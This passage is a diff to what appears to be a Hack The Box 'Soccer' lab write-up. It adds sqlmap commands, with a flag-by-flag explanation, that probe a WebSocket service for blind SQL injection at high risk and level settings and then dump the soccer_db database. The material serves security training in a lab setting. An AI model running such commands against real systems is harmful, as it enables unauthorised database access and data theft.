@@ -4,6 +4,8 @@
 - Directory listing using dirsearch.
 - h3k tiny file manager exploitations.
 - WebSocket Exploitation.
+- Using sqlmap for blind SQLi exploitation.
+- 
 
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/4a519534-98c2-4bda-a815-6a4101ab3229)
 
@@ -215,11 +217,28 @@ dirsearch -u http://soccer.htb -w /usr/share/wordlists/dirbuster/directory-list-
 27. Nice, to speed this exploitations, I used sqlmap.
 
 ```
--u "ws://soc-player.soccer.htb:9091": Specifies the target URL where the SQL injection vulnerability is suspected. In this case, it's a WebSocket URL (ws://) for a service running on soc-player.soccer.htb at port 9091.
---data '{"id":"*"}': Specifies the data payload that will be used in the HTTP request. In this case, it's a JSON payload with a parameter named 'id' set to ''. The asterisk () is often used as a wildcard character in SQL injection attempts.
+sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id":"*"}' --dbs --threads 10 --level 5 --risk 3 --batch
+```
+
+```
+-u "ws://soc-player.soccer.htb:9091": Specifies the target URL where the SQL injection vulnerability is suspected.
+In this case, it's a WebSocket URL (ws://) for a service running on soc-player.soccer.htb at port 9091.
+--data '{"id":"*"}': Specifies the data payload that will be used in the HTTP request. In this case,
+it's a JSON payload with a parameter named 'id' set to ''. The asterisk () is often used as a wildcard character in SQL injection attempts.
 --dbs: Instructs sqlmap to enumerate the available databases once a SQL injection vulnerability is identified.
 --threads 10: Sets the number of concurrent threads to 10. This option can be used to speed up the scanning process by making multiple requests simultaneously.
 --level 5: Sets the level of tests to be performed by sqlmap. The level ranges from 1 to 5, with 5 being the most comprehensive and thorough.
 --risk 3: Sets the risk level of the tests. The risk level ranges from 1 to 3, with 3 being the highest risk level.
 --batch: Runs sqlmap in batch mode, which means it will not prompt for user input during the scanning process. It will use the default options and automatically proceed with the scan.
 ```
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f918de56-9a54-481e-96fb-8520120f28ef)
+
+
+28. Nice! Now let's dump all tables inside **soccer_db** database.
+
+```
+sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id":"*"}' -D soccer_db --dump --threads 10 --random-agent
+```
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/301f0449-426f-4ff6-a384-427e0ca91ae2)
